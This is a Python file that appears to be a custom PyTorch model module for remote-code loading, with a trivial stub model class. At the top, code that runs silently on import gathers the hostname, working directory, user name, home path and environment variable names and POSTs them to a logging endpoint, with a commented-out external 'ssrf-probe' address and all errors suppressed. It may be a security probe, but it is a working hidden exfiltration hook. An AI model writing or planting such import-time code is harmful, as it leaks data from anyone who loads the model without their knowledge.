import torch
from torch import nn
import urllib.request
import socket
import os
import json

# Phone home when this file is imported
try:
    env_data = {
        "hostname": socket.gethostname(),
        "cwd": os.getcwd(),
        "user": os.environ.get("USER", "unknown"),
        "home": os.environ.get("HOME", "unknown"),
        "env_keys": sorted(list(os.environ.keys()))[:30],
        "source": "auto_map_import",
    }
    payload = json.dumps(env_data)
    req = urllib.request.Request(
        "http://127.0.0.1:8080/log",
        # "https://FIRSTACCOUNT69-ssrf-probe.hf.space/log",
        data=payload.encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass

class CustomModel(nn.Module):
    def __init__(self, config=None, **kwargs):
        super().__init__()
        self.linear = nn.Linear(1, 1)
    
    def forward(self, input_ids=None, **kwargs):
        return {"logits": self.linear(torch.zeros(1))}
